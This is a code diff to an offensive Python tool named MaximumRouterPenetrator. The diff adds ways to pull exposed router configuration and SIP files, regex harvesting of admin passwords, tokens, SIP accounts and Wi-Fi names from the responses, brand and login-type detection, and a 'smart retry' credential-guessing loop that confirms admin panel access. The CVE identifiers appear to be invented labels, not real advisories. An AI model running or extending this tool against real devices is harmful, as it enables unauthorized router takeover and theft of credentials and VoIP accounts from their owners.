@@ -242,6 +242,8 @@ class MaximumRouterPenetrator:
             'CVE-2024-ROUTER-CONFIG': {
                 'description': 'Universal configuration file access without authentication',
                 'brands': ['*'],
+                'type': 'configuration_exposure',
+                'severity': 'critical',
                 'endpoints': [
                     '/cgi-bin/config.exp?download=1',
                     '/backup.conf?export=true',
@@ -256,9 +258,11 @@ class MaximumRouterPenetrator:
             'CVE-2024-SIP-EXPOSURE': {
                 'description': 'Universal SIP configuration exposure vulnerability',
                 'brands': ['*'],
+                'type': 'sip_exposure',
+                'severity': 'high',
                 'endpoints': [
                     '/voip.xml?show=all',
-                    '/sip.conf?export=true', 
+                    '/sip.conf?export=true',
                     '/voice.cfg?download=1',
                     '/admin/voip.asp?action=export',
                     '/voip.json?download=1',
@@ -1228,19 +1232,25 @@ class MaximumRouterPenetrator:
             detected_brand = None
             detection_method = None
             
-            # Check content for brand indicators
+            # Check content for brand indicators with scoring
+            brand_scores = {}
             for brand, indicators in enhanced_brands.items():
+                brand_scores[brand] = 0
                 for indicator in indicators:
-                    if indicator in content:
-                        detected_brand = brand
-                        detection_method = f"content:'{indicator}'"
-                        router_info['detection_score'] += 10
-                        router_info['detection_details'].append(f"Brand detected: {brand} via {indicator}")
-                        if verbose:
-                            print(f"         ✅ LIVE DEBUG: Brand detected: {brand.upper()} (found: '{indicator}')")
-                        break
-                if detected_brand:
-                    break
+                    if indicator.lower() in content:
+                        brand_scores[brand] += 1
+                        router_info['detection_details'].append(f"Brand indicator: {indicator} (brand: {brand})")
+            
+            # Find brand with highest score
+            if brand_scores:
+                max_score = max(brand_scores.values())
+                if max_score > 0:
+                    detected_brand = max(brand_scores, key=brand_scores.get)
+                    detection_method = f"content_indicators_{max_score}"
+                    router_info['detection_score'] += max_score * 3
+                    if verbose:
+                        print(f"         🏷️ LIVE DEBUG: Brand detected: {detected_brand.upper()} (score: {max_score})")
+                        print(f"         📊 LIVE DEBUG: Brand indicators found: {max_score}")
             
             # Check server headers
             if not detected_brand and headers.get('server'):
@@ -1407,14 +1417,21 @@ class MaximumRouterPenetrator:
                                     'content': content,
                                     'extracted_info': extracted_info,
                                     'verification_score': found,
-                                    'total_indicators': len(indicators)
+                                    'total_indicators': len(indicators),
+                                    'vulnerability_type': cve_info.get('type', 'unknown'),
+                                    'severity': cve_info.get('severity', 'medium'),
+                                    'description': cve_info.get('description', ''),
+                                    'extracted_data': self._extract_router_data_from_cve(content, cve_id, verbose)
                                 }
                                 
                                 if verbose:
                                     print(f"               ✅ CVE SUCCESS: {cve_id} via {protocol}")
                                     print(f"               📊 Verification score: {found}/{len(indicators)}")
+                                    print(f"               🔥 Severity: {cve_info.get('severity', 'medium').upper()}")
                                     if extracted_info:
                                         print(f"               📋 Extracted info: {len(extracted_info)} items")
+                                    if cve_result['extracted_data']:
+                                        print(f"               📊 Router data extracted: {len(cve_result['extracted_data'])} items")
                                 return cve_result
                             else:
                                 if verbose:
@@ -1432,6 +1449,299 @@ class MaximumRouterPenetrator:
             print(f"            ❌ All CVE tests unsuccessful")
         
         return cve_result
+    
+    def _extract_cve_information(self, cve_id: str, content: str, verbose: bool) -> Dict[str, Any]:
+        """Extract specific information from successful CVE exploitation"""
+        extracted_info = {
+            'cve_id': cve_id,
+            'extracted_at': datetime.now().isoformat(),
+            'content_length': len(content),
+            'data_types': [],
+            'sensitive_data': [],
+            'configuration_data': [],
+            'network_info': [],
+            'credentials_found': [],
+            'sip_accounts': []
+        }
+        
+        try:
+            if verbose:
+                print(f"                  🔍 LIVE DEBUG: Extracting information from {cve_id}...")
+            
+            # Extract based on CVE type
+            if 'CONFIG' in cve_id.upper():
+                extracted_info.update(self._extract_config_data(content, verbose))
+            elif 'SIP' in cve_id.upper() or 'VOIP' in cve_id.upper():
+                extracted_info.update(self._extract_sip_data(content, verbose))
+            elif 'AUTH' in cve_id.upper() or 'BYPASS' in cve_id.upper():
+                extracted_info.update(self._extract_auth_data(content, verbose))
+            else:
+                # Generic extraction
+                extracted_info.update(self._extract_generic_data(content, verbose))
+            
+            if verbose:
+                print(f"                  📊 LIVE DEBUG: Extracted {len(extracted_info.get('data_types', []))} data types")
+        
+        except Exception as e:
+            if verbose:
+                print(f"                  ❌ LIVE DEBUG: CVE extraction error: {str(e)[:50]}")
+        
+        return extracted_info
+    
+    def _extract_router_data_from_cve(self, content: str, cve_id: str, verbose: bool) -> Dict[str, Any]:
+        """Extract router-specific data from CVE content"""
+        router_data = {
+            'brand_indicators': [],
+            'model_indicators': [],
+            'firmware_version': '',
+            'hardware_info': [],
+            'network_config': [],
+            'admin_credentials': [],
+            'sip_accounts': [],
+            'config_files': []
+        }
+        
+        try:
+            # Brand detection from content
+            brand_patterns = {
+                'netcomm': ['netcomm', 'nf-', 'nl-', 'netcomm wireless'],
+                'tplink': ['tplink', 'tp-link', 'archer', 'tl-'],
+                'dlink': ['dlink', 'd-link', 'dir-', 'dgs-'],
+                'cisco': ['cisco', 'linksys', 'wrt', 'ea'],
+                'huawei': ['huawei', 'hg', 'e5573', 'b315'],
+                'asus': ['asus', 'rt-', 'ac-', 'ax-'],
+                'linksys': ['linksys', 'wrt', 'ea', 'e2500']
+            }
+            
+            content_lower = content.lower()
+            for brand, patterns in brand_patterns.items():
+                for pattern in patterns:
+                    if pattern in content_lower:
+                        router_data['brand_indicators'].append(brand)
+                        if verbose:
+                            print(f"                  🏷️ LIVE DEBUG: Brand indicator found: {brand}")
+                        break
+            
+            # Model detection
+            model_patterns = [
+                r'model[:\s]+([a-zA-Z0-9\-_]+)',
+                r'device[:\s]+([a-zA-Z0-9\-_]+)',
+                r'product[:\s]+([a-zA-Z0-9\-_]+)',
+                r'version[:\s]+([a-zA-Z0-9\-_.]+)'
+            ]
+            
+            for pattern in model_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                if matches:
+                    router_data['model_indicators'].extend(matches)
+                    if verbose:
+                        print(f"                  📱 LIVE DEBUG: Model indicators found: {matches}")
+            
+            # Firmware version
+            fw_patterns = [
+                r'firmware[:\s]+([0-9]+\.[0-9]+\.[0-9]+)',
+                r'version[:\s]+([0-9]+\.[0-9]+\.[0-9]+)',
+                r'build[:\s]+([0-9]+\.[0-9]+\.[0-9]+)'
+            ]
+            
+            for pattern in fw_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                if matches:
+                    router_data['firmware_version'] = matches[0]
+                    if verbose:
+                        print(f"                  🔧 LIVE DEBUG: Firmware version: {matches[0]}")
+                    break
+            
+            # Admin credentials
+            cred_patterns = [
+                r'admin[:\s]+([a-zA-Z0-9_]+)',
+                r'username[:\s]+([a-zA-Z0-9_]+)',
+                r'user[:\s]+([a-zA-Z0-9_]+)',
+                r'password[:\s]+([a-zA-Z0-9_@#$%^&*()]+)',
+                r'pass[:\s]+([a-zA-Z0-9_@#$%^&*()]+)'
+            ]
+            
+            for pattern in cred_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                if matches:
+                    router_data['admin_credentials'].extend(matches)
+                    if verbose:
+                        print(f"                  🔑 LIVE DEBUG: Credentials found: {matches}")
+            
+            # SIP accounts
+            sip_patterns = [
+                r'sip[:\s]+([^@\s]+)@([^:\s]+)',
+                r'voip[:\s]+([^@\s]+)@([^:\s]+)',
+                r'username[:\s]+([^\s\n]+).*?password[:\s]+([^\s\n]+)'
+            ]
+            
+            for pattern in sip_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
+                if matches:
+                    router_data['sip_accounts'].extend(matches)
+                    if verbose:
+                        print(f"                  📞 LIVE DEBUG: SIP accounts found: {matches}")
+        
+        except Exception as e:
+            if verbose:
+                print(f"                  ❌ LIVE DEBUG: Router data extraction error: {str(e)[:50]}")
+        
+        return router_data
+    
+    def _extract_config_data(self, content: str, verbose: bool) -> Dict[str, Any]:
+        """Extract configuration data from CVE content"""
+        config_data = {
+            'data_types': ['configuration'],
+            'sensitive_data': [],
+            'configuration_data': [],
+            'network_info': []
+        }
+        
+        try:
+            # Extract sensitive configuration data
+            sensitive_patterns = [
+                r'password[:\s]+([^\s\n]+)',
+                r'passwd[:\s]+([^\s\n]+)',
+                r'secret[:\s]+([^\s\n]+)',
+                r'key[:\s]+([^\s\n]+)',
+                r'token[:\s]+([^\s\n]+)'
+            ]
+            
+            for pattern in sensitive_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                if matches:
+                    config_data['sensitive_data'].extend(matches)
+                    if verbose:
+                        print(f"                  🔐 LIVE DEBUG: Sensitive data found: {len(matches)} items")
+            
+            # Extract network configuration
+            network_patterns = [
+                r'ip[:\s]+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)',
+                r'gateway[:\s]+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)',
+                r'dns[:\s]+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)',
+                r'ssid[:\s]+([^\s\n]+)',
+                r'wifi[:\s]+([^\s\n]+)'
+            ]
+            
+            for pattern in network_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                if matches:
+                    config_data['network_info'].extend(matches)
+                    if verbose:
+                        print(f"                  🌐 LIVE DEBUG: Network info found: {len(matches)} items")
+        
+        except Exception as e:
+            if verbose:
+                print(f"                  ❌ LIVE DEBUG: Config extraction error: {str(e)[:50]}")
+        
+        return config_data
+    
+    def _extract_sip_data(self, content: str, verbose: bool) -> Dict[str, Any]:
+        """Extract SIP/VoIP data from CVE content"""
+        sip_data = {
+            'data_types': ['sip', 'voip'],
+            'sip_accounts': [],
+            'sensitive_data': [],
+            'configuration_data': []
+        }
+        
+        try:
+            # Extract SIP accounts
+            sip_patterns = [
+                r'sip[:\s]+([^@\s]+)@([^:\s]+):?(\d+)?',
+                r'voip[:\s]+([^@\s]+)@([^:\s]+):?(\d+)?',
+                r'username[:\s]+([^\s\n]+).*?password[:\s]+([^\s\n]+)',
+                r'user[:\s]+([^\s\n]+).*?pass[:\s]+([^\s\n]+)'
+            ]
+            
+            for pattern in sip_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
+                if matches:
+                    sip_data['sip_accounts'].extend(matches)
+                    if verbose:
+                        print(f"                  📞 LIVE DEBUG: SIP accounts found: {len(matches)} items")
+            
+            # Extract SIP configuration
+            config_patterns = [
+                r'registrar[:\s]+([^\s\n]+)',
+                r'proxy[:\s]+([^\s\n]+)',
+                r'server[:\s]+([^\s\n]+)',
+                r'domain[:\s]+([^\s\n]+)'
+            ]
+            
+            for pattern in config_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                if matches:
+                    sip_data['configuration_data'].extend(matches)
+                    if verbose:
+                        print(f"                  ⚙️ LIVE DEBUG: SIP config found: {len(matches)} items")
+        
+        except Exception as e:
+            if verbose:
+                print(f"                  ❌ LIVE DEBUG: SIP extraction error: {str(e)[:50]}")
+        
+        return sip_data
+    
+    def _extract_auth_data(self, content: str, verbose: bool) -> Dict[str, Any]:
+        """Extract authentication bypass data from CVE content"""
+        auth_data = {
+            'data_types': ['authentication', 'bypass'],
+            'sensitive_data': [],
+            'credentials_found': [],
+            'configuration_data': []
+        }
+        
+        try:
+            # Extract authentication bypass indicators
+            bypass_patterns = [
+                r'bypass[:\s]+([^\s\n]+)',
+                r'auth[:\s]+([^\s\n]+)',
+                r'admin[:\s]+([^\s\n]+)',
+                r'access[:\s]+([^\s\n]+)'
+            ]
+            
+            for pattern in bypass_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                if matches:
+                    auth_data['sensitive_data'].extend(matches)
+                    if verbose:
+                        print(f"                  🔓 LIVE DEBUG: Auth bypass data found: {len(matches)} items")
+        
+        except Exception as e:
+            if verbose:
+                print(f"                  ❌ LIVE DEBUG: Auth extraction error: {str(e)[:50]}")
+        
+        return auth_data
+    
+    def _extract_generic_data(self, content: str, verbose: bool) -> Dict[str, Any]:
+        """Extract generic data from CVE content"""
+        generic_data = {
+            'data_types': ['generic'],
+            'sensitive_data': [],
+            'configuration_data': [],
+            'network_info': []
+        }
+        
+        try:
+            # Generic extraction patterns
+            generic_patterns = [
+                r'([a-zA-Z0-9_]+)[:\s]+([^\s\n]+)',
+                r'([a-zA-Z0-9_]+)=([^\s\n]+)',
+                r'([a-zA-Z0-9_]+)\s*:\s*([^\s\n]+)'
+            ]
+            
+            for pattern in generic_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                if matches:
+                    generic_data['configuration_data'].extend(matches)
+                    if verbose:
+                        print(f"                  📊 LIVE DEBUG: Generic data found: {len(matches)} items")
+        
+        except Exception as e:
+            if verbose:
+                print(f"                  ❌ LIVE DEBUG: Generic extraction error: {str(e)[:50]}")
+        
+        return generic_data
     
     def _test_verified_credentials(self, ip: str, router_info: Dict, verbose: bool) -> Dict[str, Any]:
         """Test credentials with REAL verification and authentication detection"""
@@ -3165,25 +3475,77 @@ class MaximumRouterPenetrator:
                             headers = {}
                             status = 200
                         
-                        # Analyze response for auth types
+                        # Enhanced authentication detection
                         detected_types = []
                         
+                        # Check for HTTP Basic Auth (401 status)
+                        if status == 401:
+                            detected_types.append({
+                                'type': 'BASIC_AUTH',
+                                'score': 10,
+                                'priority': 1,
+                                'method': 'http_basic'
+                            })
+                            if verbose:
+                                print(f"                  ✅ Auth type detected: BASIC_AUTH (401 status)")
+                        
+                        # Check for form-based auth
+                        form_indicators = ['form', 'input', 'password', 'username', 'login', 'submit']
+                        form_score = sum(1 for ind in form_indicators if ind in content)
+                        if form_score >= 2:
+                            detected_types.append({
+                                'type': 'FORM_BASED',
+                                'score': form_score,
+                                'priority': 2,
+                                'method': 'form_post'
+                            })
+                            if verbose:
+                                print(f"                  ✅ Auth type detected: FORM_BASED (score: {form_score})")
+                        
+                        # Check for JavaScript-based auth
+                        js_indicators = ['javascript', 'ajax', 'xmlhttprequest', 'fetch']
+                        js_score = sum(1 for ind in js_indicators if ind in content)
+                        if js_score >= 1:
+                            detected_types.append({
+                                'type': 'JAVASCRIPT_BASED',
+                                'score': js_score,
+                                'priority': 3,
+                                'method': 'javascript'
+                            })
+                            if verbose:
+                                print(f"                  ✅ Auth type detected: JAVASCRIPT_BASED (score: {js_score})")
+                        
+                        # Check for cookie-based auth
+                        cookie_indicators = ['cookie', 'session', 'token', 'csrf']
+                        cookie_score = sum(1 for ind in cookie_indicators if ind in content or ind in str(headers))
+                        if cookie_score >= 1:
+                            detected_types.append({
+                                'type': 'COOKIE_BASED',
+                                'score': cookie_score,
+                                'priority': 4,
+                                'method': 'cookie'
+                            })
+                            if verbose:
+                                print(f"                  ✅ Auth type detected: COOKIE_BASED (score: {cookie_score})")
+                        
+                        # Check other auth types from config
                         for auth_type, config in self.auth_detection_system['auth_types'].items():
-                            score = 0
-                            for indicator in config['indicators']:
-                                if indicator.lower() in content or indicator.lower() in str(headers):
-                                    score += 1
-                            
-                            if score >= 2:  # At least 2 indicators
-                                detected_types.append({
-                                    'type': auth_type,
-                                    'score': score,
-                                    'priority': config['priority'],
-                                    'method': config['test_method']
-                                })
+                            if auth_type not in ['BASIC_AUTH', 'FORM_BASED', 'JAVASCRIPT_BASED', 'COOKIE_BASED']:
+                                score = 0
+                                for indicator in config['indicators']:
+                                    if indicator.lower() in content or indicator.lower() in str(headers):
+                                        score += 1
                                 
-                                if verbose:
-                                    print(f"                  ✅ Auth type detected: {auth_type.upper()} (score: {score})")
+                                if score >= 1:  # Lowered threshold
+                                    detected_types.append({
+                                        'type': auth_type,
+                                        'score': score,
+                                        'priority': config['priority'],
+                                        'method': config['test_method']
+                                    })
+                                    
+                                    if verbose:
+                                        print(f"                  ✅ Auth type detected: {auth_type.upper()} (score: {score})")
                         
                         if detected_types:
                             auth_info['login_endpoints'].append({
@@ -3826,42 +4188,35 @@ class MaximumRouterPenetrator:
         if verbose:
             print(f"            🔑 LIVE DEBUG: Testing credentials on {protocol}:{port}...")
         
-        # Test priority credentials on this port
+        # Test priority credentials on this port using smart retry
         for i, (username, password) in enumerate(self.priority_credentials, 1):
             if verbose:
                 print(f"               🔗 LIVE DEBUG: [{i}/4] Testing: {username}:{password}")
             
-            try:
-                # Try HTTP Basic Auth first
-                if REQUESTS_AVAILABLE:
-                    session = requests.Session()
+            # Use smart retry system for better success rate
+            login_result = self._smart_retry_login(ip, username, password, verbose)
+            
+            if login_result['success']:
+                # Verify admin panel access
+                admin_verification = self._verify_admin_panel_real(ip, login_result, verbose)
+                
+                if admin_verification['confirmed']:
+                    auth_result = {
+                        'verified_access': True,
+                        'credentials': (username, password),
+                        'session': login_result.get('session'),
+                        'port': port,
+                        'protocol': protocol,
+                        'auth_method': login_result.get('method', 'unknown'),
+                        'verification_score': admin_verification.get('score', 0),
+                        'admin_pages': admin_verification.get('pages_accessed', [])
+                    }
                     
-                    # Try basic auth
-                    response = session.get(f"{base_url}/admin/", 
-                                         auth=requests.auth.HTTPBasicAuth(username, password),
-                                         timeout=5, verify=False)
+                    if verbose:
+                        print(f"                  ✅ LIVE DEBUG: Smart retry success on {protocol}:{port}!")
+                        print(f"                  📊 LIVE DEBUG: Admin verification score: {admin_verification.get('score', 0)}")
                     
-                    if response.status_code == 200:
-                        # Check for admin indicators
-                        admin_indicators = ['admin', 'configuration', 'settings', 'logout', 'system']
-                        found_indicators = sum(1 for ind in admin_indicators 
-                                             if ind in response.text.lower())
-                        
-                        if found_indicators >= 2:
-                            auth_result = {
-                                'verified_access': True,
-                                'credentials': (username, password),
-                                'session': session,
-                                'port': port,
-                                'protocol': protocol,
-                                'auth_method': 'http_basic',
-                                'verification_score': found_indicators
-                            }
-                            
-                            if verbose:
-                                print(f"                  ✅ LIVE DEBUG: Basic auth success on {protocol}:{port}!")
-                            
-                            return auth_result
+                    return auth_result
                     
                     # Try form-based auth if basic failed
                     login_data = {
